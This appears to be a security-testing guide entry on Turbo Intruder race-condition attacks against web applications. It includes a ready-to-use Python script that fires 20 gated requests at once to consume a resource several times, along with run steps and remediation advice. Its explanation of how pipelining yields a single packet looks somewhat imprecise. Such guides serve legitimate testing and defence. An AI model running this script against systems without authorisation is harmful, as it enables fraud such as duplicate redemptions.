# Turbo Intruder — Single-Packet Attack

## Summary
Turbo Intruder is a Burp Suite extension that sends requests in a single TCP packet, eliminating network latency as a factor and maximising the race window.

## Setup

### Installation
1. Install from the Burp App Store: Extender → BApp Store → Turbo Intruder
2. Or clone from GitHub: `git clone https://github.com/PortSwigger/turbo-intruder`

### Basic Usage
Send a request to Turbo Intruder via right-click → Extensions → Turbo Intruder → Send to Turbo Intruder.

### Python Script for Race Conditions
Create a `.py` script to define the attack:

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=20,
                           pipeline=True)

    # Send all requests in a single packet burst
    for i in range(20):
        engine.queue(target.req, gate='race1')

    # Open the gate to send all queued requests simultaneously
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    # Report any duplicate successful responses
    if 'success' in req.response and req.status == 200:
        table.add(req)
```

### Single-Packet Attack Explained
Normal concurrent requests travel in separate TCP packets and may arrive at different times. By pipelining requests over a single connection, Turbo Intruder ensures they all arrive in one TCP segment, giving the server the smallest possible time window to process them sequentially.

### Running the Attack
1. Right-click the request → Extensions → Turbo Intruder → Send to Turbo Intruder
2. Load your Python script
3. Click "Attack"
4. Review results — look for the same resource being consumed multiple times

## Remediation
- Atomic database operations with row-level locking
- Unique constraints on redemption codes
- Server-side request deduplication with idempotency keys
